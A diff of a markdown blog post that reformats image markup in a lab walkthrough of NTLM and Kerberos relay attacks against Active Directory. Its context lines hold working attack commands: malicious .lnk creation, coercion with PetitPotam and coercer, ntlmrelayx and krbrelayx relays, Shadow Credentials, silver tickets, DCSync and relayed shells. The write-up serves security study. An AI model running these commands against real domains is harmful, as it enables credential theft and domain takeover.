@@ -26,10 +26,11 @@ I just want to clarify conditions and steps to exploit relay attacks. Each techn
 
 ## Lab
 This is the overview of the lab. I will demonstrate NTLM/Kerberos relay attacks from DC1/WKS to DC2/CA. In this blog, DC1 and DC2 are sometimes used as synonyms for the relay source and the relay target respectively.
-<div style="text-align: center; margin: -1.5em 0 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/84.png" width="600" style="" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Lab</div>
-</div>
+  <figcaption>Lab</figcaption>
+</figure>
 
 <p style="margin-bottom:0.25em">
 There are 2 accounts in this lab:
@@ -45,10 +46,11 @@ SMB signing must not be required to perform the relay attack. Historically, only
 ```sh
 netexec smb dc2.kawakatz.local
 ```
-<div style="text-align: center; margin: 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/3.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">SMB signing is not required</div>
-</div>
+  <figcaption>SMB signing is not required</figcaption>
+</figure>
 
 #### Examples
 NTLM relay to SMB is pretty simple, but examples which can be **actively** exploited are somewhat limited. This is because only machine accounts can be coerced to initiate NTLM authentication without user interaction. However, exploiting machine account privileges on SMB is challenging. Even domain controllers lack special privileges over each other, and it is rare for a machine account to have administrator/exploitable rights on another server.  
@@ -66,22 +68,25 @@ $lnk.Description = "Salaries-2023."
 $lnk.HotKey = "Ctrl+Alt+O"
 $lnk.Save()
 ```
-<div style="text-align: center; margin: 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/36.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Creating a malicious link file</div>
-</div>
+  <figcaption>Creating a malicious link file</figcaption>
+</figure>
 
 ```sh
 sudo python3 ntlmrelayx.py -smb2support -t smb://dc2.kawakatz.local -c whoami
 ```
-<div style="text-align: center; margin: 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/37.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Deployed link file</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Deployed link file</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/38.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay over SMB to SMB</div>
-</div>
+  <figcaption>NTLM relay over SMB to SMB</figcaption>
+</figure>
 
 ## NTLM Relay to LDAP/LDAPS
 #### Prerequisites
@@ -89,10 +94,11 @@ LDAP signing or LDAP channel binding must not be required to perform the relay a
 ```sh
 python3 LdapRelayScan.py -method BOTH -dc-ip <dc ip> -u coward -p 'P@ssw0rd'
 ```
-<div style="text-align: center; margin: 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/31.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">LDAP signing and LDAP channel binding are not required</div>
-</div>
+  <figcaption>LDAP signing and LDAP channel binding are not required</figcaption>
+</figure>
 
 #### Examples
 NTLM relay to LDAP is somewhat tricky. The details are described again in ["NTLM Relay"](https://en.hackndo.com/ntlm-relay/) by Pixis. During NTLM authentication, clients and servers indicate whether they support signing using the NEGOTIATE_SIGN flag. LDAP decides whether it uses LDAP signing based on the flag. LDAP servers always support LDAP signing (NEGOTIATE_SIGN = 1), so clients must set the flag to 0 to avoid LDAP signing. However, Windows' SMB clients set the flag to 1. We cannot overwrite the flag without breaking MIC (Message Integrity Code). We cannot simply drop the MIC because the msAvFlags indicates the presence of the MIC. We cannot overwrite the msAvFlags because the modification invalidates the NetNTLMv2 hash we want to relay. Of course, we cannot recalculate the NTLMv2 hash because we don't know the user's secret.
@@ -103,7 +109,7 @@ So, to perform NTLM relay over SMB to LDAP/LDAPS, more conditions must be met. W
 - DC2 allows the Drop the MIC attack (e.g., CVE-2019-1040)
 - DC1 allows NTLMv1 authentication (LmCompatibilityLevel<sup>*</sup> <= 2)
 
-<p style="margin-bottom:0em"><em>* LmCompatibilityLevel</em></p>
+<p><em>* LmCompatibilityLevel</em></p>
 ```registry
 Key: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa  
 Name: LMCompatibilityLevel  
@@ -120,19 +126,21 @@ To verify LmCompatibilityLevel <= 2, we need to receive NTLM authentication from
 sudo python3 Responder.py -I ens33
 python3 PetitPotam.py -d kawakatz.local -u coward -p 'P@ssw0rd' <attacker ip> dc1.kawakatz.local
 ```
-<div style="text-align: center; margin: 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/50.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">When LmCompatibilityLevel <= 2</div>
-</div>
+  <figcaption>When LmCompatibilityLevel <= 2</figcaption>
+</figure>
 
 The primary communication channels between DC1 and us are SMB (as already mentioned) and HTTP. To coerce NTLM authentication over HTTP, the WebClient service must be enabled on DC1. You can verify whether it's enabled by enumerating named pipes on DC1 as [posted](https://x.com/tifkin_/status/1419806476353298442) by @tifkin_. This check is also implemented as a NetExec module. NTLM authentication over HTTP is attractive for relay because the protocol itself has no message-signing capability, unlike SMB/LDAP. In practice, this results in NEGOTIATE_SIGN = 0 and makes the relay work regardless of the conditions mentioned above.
 ```sh
 netexec smb dc1.kawakatz.local -u coward -p 'P@ssw0rd' -M webdav
 ```
-<div style="text-align: center; margin: 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/35.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">NetExec WebDAV module</div>
-</div>
+  <figcaption>NetExec WebDAV module</figcaption>
+</figure>
 
 It's quite rare to see the WebClient service enabled. For that reason, we often choose NTLM relay over SMB. When we use a compromised Windows device to relay, we need to listen on 445/tcp to receive SMB traffic. Since Windows itself already binds that port, we must first free or hijack it. If we have local administrator privileges on the device, a technique introduced in ["Relay Your Heart Away: An OPSEC-Conscious Approach to 445 Takeover"](https://posts.specterops.io/relay-your-heart-away-an-opsec-conscious-approach-to-445-takeover-1c9b4666c8ac) by SpecterOps can be useful. Alternatively, when we lack local administrator privileges, we can connect our device directly to the target network via VPN.
 
@@ -155,22 +163,26 @@ sudo python3 getST.py -spn cifs/dc1.kawakatz.local kawakatz.local/'KAWAPC$':'P@s
 export KRB5CCNAME=Administrator@cifs_dc1.kawakatz.local@KAWAKATZ.LOCAL.ccache
 sudo python3 smbclient.py -k -no-pass kawakatz.local/Administrator@dc1.kawakatz.local
 ```
-<div style="text-align: center; margin: 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/11.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Adding a machine account</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Adding a machine account</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/4.png" width="720" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Coercing NTLM authentication over SMB</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Coercing NTLM authentication over SMB</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/12.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay over SMB to LDAP with NTLMv1</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>NTLM relay over SMB to LDAP with NTLMv1</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/13.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Impersonating Administrator</div>
-</div>
+  <figcaption>Impersonating Administrator</figcaption>
+</figure>
 
 When we cannot add a computer account, we can instead exploit NTLM relay to LDAP/LDAPS using the Shadow Credentials technique, as follows. For more details on Shadow Credentials and the technique to generate silver tickets, see ["Shadow Credentials"](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials), ["UnPAC the hash"](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash), and ["Silver tickets"](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver) from The Hacker Recipes.
 ```sh
@@ -194,30 +206,36 @@ export KRB5CCNAME=/tmp/DC1.ccache
 sudo python3 secretsdump.py -k -no-pass kawakatz.local/'DC1$'@dc2.kawakatz.local -just-dc-user Administrator
 netexec smb <dc ip> -u Administrator -H <hash>
 ```
-<div style="text-align: center; margin: 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/8.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay over SMB to LDAP with NTLMv1</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>NTLM relay over SMB to LDAP with NTLMv1</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/9.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Issuing a TGT</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Issuing a TGT</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/15.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Retrieving the NTLM hash of DC1$</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Retrieving the NTLM hash of DC1$</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/16.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Generating a silver ticket</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Generating a silver ticket</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/17.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Impersonating Administrator</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Impersonating Administrator</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/10.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Performing DCSync</div>
-</div>
+  <figcaption>Performing DCSync</figcaption>
+</figure>
 
 The image in ["NTLM relay"](https://www.thehacker.recipes/ad/movement/ntlm/relay) on The Hacker Recipes makes it easy to understand these conditions for NTLM relay to LDAP/LDAPS.
 
@@ -240,26 +258,31 @@ python3 PetitPotam.py -d kawakatz.local -u coward -p 'P@ssw0rd' attacker.kawakat
 # This works
 python3 PetitPotam.py -d kawakatz.local -u coward -p 'P@ssw0rd' attacker@80/share dc1.kawakatz.local
 ```
-<div style="text-align: center; margin: 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/51.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Adding a DNS record</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Adding a DNS record</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/53.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Invalid coercion</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Invalid coercion</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/54.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Anonymous WebDAV access</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Anonymous WebDAV access</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/55.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Valid coercion</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Valid coercion</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/56.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Authenticated WebDAV access</div>
-</div>
+  <figcaption>Authenticated WebDAV access</figcaption>
+</figure>
 
 NTLM relay over HTTP to LDAP is often exploited for local privilege escalation, as demonstrated in [NTLMRelay2Self](https://github.com/med0x2e/NTLMRelay2Self). By default, the WebClient service is not enabled on Windows, but if we register an ETW event trigger, Windows automatically enables the WebClient service. This method does not require local administrator privileges. Then, we can coerce NTLM authentication from the machine account over HTTP and relay it to LDAP. Using the techniques described above (RBCD or Shadow Credentials), we can take over the machine account and gain local administrator privileges.
 ```sh
@@ -277,18 +300,21 @@ python3 PetitPotam.py -u coward -p 'P@ssw0rd' -d kawakatz.local attacker@80/shar
 
 # Abuse the certificate as above...
 ```
-<div style="text-align: center; margin: 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/14.png" width="700" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Activating the WebClient service</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Activating the WebClient service</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/39.png" width="750" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Coercing NTLM authentication over HTTP</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Coercing NTLM authentication over HTTP</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/40.png" width="750" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay over HTTP to LDAP</div>
-</div>
+  <figcaption>NTLM relay over HTTP to LDAP</figcaption>
+</figure>
 
 ## NTLM Relay to HTTP/HTTPS
 #### Prerequisites
@@ -296,10 +322,11 @@ HTTP is generally vulnerable to relay attacks. EPA (Extended Protection for Auth
 ```sh
 certipy find -u coward -p 'P@ssw0rd' -dc-ip <dc ip>
 ```
-<div style="text-align: center; margin: 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/66.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">HTTP and EPA check</div>
-</div>
+  <figcaption>HTTP and EPA check</figcaption>
+</figure>
 
 <p style="margin-bottom:0.25em">
 If the AD CS Web Enrollment role is installed, the default configuration has historically been vulnerable to NTLM relay (ESC8). However, according to <a href="https://blog.redteam-pentesting.de/2025/windows-coercion/">"The Ultimate Guide to Windows Coercion Techniques in 2025"</a>,
@@ -331,22 +358,26 @@ export KRB5CCNAME=/tmp/DC1.ccache
 python3 secretsdump.py -k -no-pass kawakatz.local/'DC1$'@dc2.kawakatz.local -just-dc-user Administrator
 netexec smb <dc ip> -u Administrator -H <hash>
 ```
-<div style="text-align: center; margin: 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/18.png" width="700" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">An abusable template</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>An abusable template</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/19.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay over SMB to HTTP</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>NTLM relay over SMB to HTTP</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/20.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Issuing a TGT</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Issuing a TGT</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/21.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Performing DCSync</div>
-</div>
+  <figcaption>Performing DCSync</figcaption>
+</figure>
 
 ## NTLM Relay to WinRM/WinRMS
 #### Prerequisites
@@ -359,36 +390,43 @@ Generally speaking, NTLM relay to WinRM is impossible because the protocol has i
 sudo python3 ntlmrelayx.py -smb2support -t winrms://dc2.kawakatz.local
 nc 127.0.0.1 11000
 ```
-<div style="text-align: center; margin: 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/46.png" width="700" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Deployed link file</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Deployed link file</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/44.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay over SMB to WinRMS</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>NTLM relay over SMB to WinRMS</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/47.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay over HTTP to WinRMS</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>NTLM relay over HTTP to WinRMS</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/45.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Interactive shell</div>
-</div>
+  <figcaption>Interactive shell</figcaption>
+</figure>
 
 With Microsoft Edge, NTLM authentication over HTTP is started automatically if a URL is handled as an Intranet Zone. Otherwise, a prompt appears. This behavior is important for coercing user authentication over HTTP. As described above, LmCompatibilityLevel <= 2 must be met. In the images below, LmCompatibilityLevel == 5 and the relay attack failed because CBT was used with NTLMv2.
-<div style="text-align: center; margin: -1em 0 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/57.png" width="550" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">URL in Intranet Zone</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>URL in Intranet Zone</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/59.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Authenticated access</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Authenticated access</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/58.png" width="550" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">URL out of Intranet Zone</div>
-</div>
+  <figcaption>URL out of Intranet Zone</figcaption>
+</figure>
 
 NTLM relay to WinRMS is technically interesting, but it's quite rare that WinRMS is enabled. For user authentication over HTTP, there are some interesting articles like ["WSUS Is SUS: NTLM Relay Attacks in Plain Sight"](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight) and ["Taking the relaying capabilities of multicast poisoning to the next level: tricking Windows SMB clients into falling back to WebDav"](https://www.synacktiv.com/publications/taking-the-relaying-capabilities-of-multicast-poisoning-to-the-next-level-tricking).
 
@@ -403,14 +441,16 @@ NTLM relay to MSSQL is uncommon, but [TAKEOVER-1](https://github.com/subat0mik/M
 sudo python3 ntlmrelayx.py -smb2support -t mssql://dc2.kawakatz.local -i
 nc 127.0.0.1 11000
 ```
-<div style="text-align: center; margin: 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/48.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay over SMB to MSSQL</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>NTLM relay over SMB to MSSQL</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/49.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Interactive shell</div>
-</div>
+  <figcaption>Interactive shell</figcaption>
+</figure>
 
 # Kerberos Relay
 Kerberos relay is similar to NTLM relay, but it has its own challenges. "2. Kerberos relaying : state of the art" in ["Abusing multicast poisoning for pre-authenticated Kerberos relay over HTTP with Responder and krbrelayx"](https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with) describes this perfectly. In short, asking DC1 to send us an AP-REQ that includes a service ticket for DC2/CA is not a simple task. We need some tricks described below to achieve this. James Forshaw published some ideas in ["Using Kerberos for Authentication Relay Attacks"](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html), and researchers have since implemented tools based on these techniques to achieve Kerberos relay.
@@ -440,22 +480,26 @@ python3 gets4uticket.py 'kerberos+ccache://kawakatz.local\wks$:wks.ccache@dc1.ka
 export KRB5CCNAME=/tmp/Administrator.ccache
 sudo python3 smbclient.py -k -no-pass kawakatz.local/Administrator@wks.kawakatz.local
 ```
-<div style="text-align: center; margin: 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/27.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Refusing a dynamic update</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Refusing a dynamic update</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/28.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Kerberos relay over DNS to HTTP</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Kerberos relay over DNS to HTTP</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/29.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Issuing a TGT</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Issuing a TGT</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/30.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Impersonating Administrator</div>
-</div>
+  <figcaption>Impersonating Administrator</figcaption>
+</figure>
 
 ## Kerberos Relay over SMB (Patched)
 Kerberos relay over SMB was introduced in ["Relaying Kerberos over SMB using krbrelayx"](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx) by Synacktiv. If we coerce Kerberos authentication to a specially crafted hostname, a client sends a valid AP_REQ to us. The AP_REQ can be simply relayed.
@@ -497,22 +541,26 @@ python3 gets4uticket.py 'kerberos+ccache://kawakatz.local\dc1$:DC1.ccache@dc1.ka
 export KRB5CCNAME=/tmp/Administrator.ccache
 python3 smbclient.py -k -no-pass kawakatz.local/Administrator@dc1.kawakatz.local
 ```
-<div style="text-align: center; margin: 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/22.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Adding a DNS record</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Adding a DNS record</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/23.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Kerberos relay over SMB to HTTP</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Kerberos relay over SMB to HTTP</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/24.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Obtaining a ticket</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Obtaining a ticket</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/26.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Impersonating Administrator</div>
-</div>
+  <figcaption>Impersonating Administrator</figcaption>
+</figure>
 
 #### Reflective NTLM/Kerberos Relay over SMB
 It’s worth noting CVE-2025-33073, introduced in ["A Look in the Mirror - The Reflective Kerberos Relay Attack"](https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/).
@@ -530,18 +578,21 @@ python3 dnstool.py -u kawakatz.local\\coward -p 'P@ssw0rd' -r dc11UWhRCAAAAAAAAA
 sudo python3 krbrelayx.py -t smb://dc1.kawakatz.local -c 'whoami'
 coercer coerce -u coward -p 'P@ssw0rd' -d kawakatz.local -t dc1.kawakatz.local -l dc11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
 ```
-<div style="text-align: center; margin: 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/33.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Coercing Kerberos authentication over SMB</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Coercing Kerberos authentication over SMB</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/32.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">LLMNR spoofing</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>LLMNR spoofing</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/34.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Reflective Kerberos relay over SMB to SMB</div>
-</div>
+  <figcaption>Reflective Kerberos relay over SMB to SMB</figcaption>
+</figure>
 
 <p style="margin-bottom:0.25em">
 Surprisingly, we can also use ntlmrelayx.py as described in <a href="https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025">"NTLM reflection is dead, long live NTLM reflection! – An in-depth analysis of CVE-2025-33073"</a>. The crafted hostname triggers NTLM local authentication and the behavior gives us high privileges because:
@@ -558,18 +609,21 @@ Since a patch for CVE-2025-33073 made this technique unusable, as described belo
 <blockquote style="margin-top:.5em">
 Therefore, this call was added to prevent any SMB connection if the use of a target name with marshalled target information was detected. Therefore, this patch prevents the exploitation of the vulnerability by removing the ability to coerce machines into authenticating via Kerberos by registering a DNS record with marshalled target information.
 </blockquote>
-<div style="text-align: center; margin: 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/60.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Coercion with the trick before patching (works)</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Coercion with the trick before patching (works)</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/61.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Coercion with the trick after patching (does not works)</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Coercion with the trick after patching (does not works)</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/62.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Normal coercion after patching (still works)</div>
-</div>
+  <figcaption>Normal coercion after patching (still works)</figcaption>
+</figure>
 
 ## Kerberos Relay over HTTP
 Kerberos relay over HTTP was introduced in ["Abusing multicast poisoning for pre-authenticated Kerberos relay over HTTP with Responder and krbrelayx"](https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with). A key trick of this relay is that HTTP clients construct the SPN based on the answer name from LLMNR.
@@ -592,18 +646,21 @@ python3 PetitPotam.py -d kawakatz.local -u coward -p 'P@ssw0rd' nonexist@80/test
 
 # Abuse the certificate as above...
 ```
-<div style="text-align: center; margin: 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/41.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Coercing Kerberos authentication over HTTP</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Coercing Kerberos authentication over HTTP</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/42.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">LLMNR spoofing with spoofed answer name</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>LLMNR spoofing with spoofed answer name</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/43.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Kerberos relay over HTTP to HTTP</div>
-</div>
+  <figcaption>Kerberos relay over HTTP to HTTP</figcaption>
+</figure>
 
 ## Kerberos Relay to SMB and LDAP/LDAPS
 Kerberos relay to SMB also works straightforwardly.
@@ -611,14 +668,16 @@ Kerberos relay to SMB also works straightforwardly.
 # Kerberos relay to SMB
 sudo python3 krbrelayx.py -smb2support -t smb://dc2.kawakatz.local --enum-local-admins
 ```
-<div style="text-align: center; margin: 20px 0;">
+
+<figure>
   <img src="/assets/img/20251029/64.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Kerberos relay over DNS to SMB</div>
-</div>
-<div style="text-align: center; margin: 20px 0;">
+  <figcaption>Kerberos relay over DNS to SMB</figcaption>
+</figure>
+
+<figure>
   <img src="/assets/img/20251029/65.png" width="800" style="border: 1px solid black;" alt=""/>
-  <div style="font-style: italic; color: #666; margin-top: 0px;">Kerberos relay over HTTP to SMB</div>
-</div>
+  <figcaption>Kerberos relay over HTTP to SMB</figcaption>
+</figure>
 
 <p style="margin-bottom:0.25em">
